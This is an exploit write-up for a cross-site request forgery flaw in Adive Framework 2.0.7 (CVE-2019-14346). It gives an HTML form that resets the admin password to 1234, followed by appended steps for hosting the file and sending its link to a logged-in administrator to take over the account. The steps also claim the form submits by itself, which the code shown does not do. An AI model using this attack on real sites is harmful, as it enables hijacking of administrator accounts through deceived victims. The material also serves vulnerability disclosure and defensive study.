# Exploit Title: Adive Framework 2.0.7 â€“ Cross-Site Request Forgery (CSRF)
# Date:02/08/2019.
# Exploit Author: Pablo Santiago
# Vendor Homepage: https://adive.es
# Software Link: https://github.com/ferdinandmartin/adive-php7
# Version: 2.0.7
# Tested on: Windows and Kali linux
# CVE :2019-14346

# 1. Technical Description:
# Adive Framework 2.0.7 and possibly before are affected by Cross-Site
#Request Forgery vulnerability, an attacker could change any user
password.

# 2. Proof Of Concept (CODE):

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/adive/admin/config" method="POST">
      <input type="hidden" name="userName" value="admin" />
      <input type="hidden" name="confPermissions" value="1" />
      <input type="hidden" name="pass" value="1234" />
      <input type="hidden" name="cpass" value="1234" />
      <input type="hidden" name="invokeType" value="web" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

# 3. References:
# https://hackpuntes.com/cve-2019-14346-adive-framework-2-0-7-cross-site-request-forgery/
# https://imgur.com/apuZa9q






Instructions:

Create the Exploit HTML File:

Open a text editor and create a new file named csrf_adive.html.

Copy and paste the following HTML code into csrf_adive.html:
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/adive/admin/config" method="POST">
      <input type="hidden" name="userName" value="admin" />
      <input type="hidden" name="confPermissions" value="1" />
      <input type="hidden" name="pass" value="1234" />
      <input type="hidden" name="cpass" value="1234" />
      <input type="hidden" name="invokeType" value="web" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Save the file.

Host the csrf_adive.html file on a web server. You can use a simple HTTP server for this. For example, using Python:
python3 -m http.server 8000

This will serve the file at http://localhost:8000/csrf_adive.html.

Open a browser and navigate to the hosted exploit file URL, e.g., http://localhost:8000/csrf_adive.html. Also, send this URL to an administrator of the Adive Framework site.

If the administrator is logged into Adive Framework and visits the URL, the form will be submitted automatically, changing the admin password to 1234.


Try logging into Adive Framework with the new password (1234) to ensure the password has been changed.


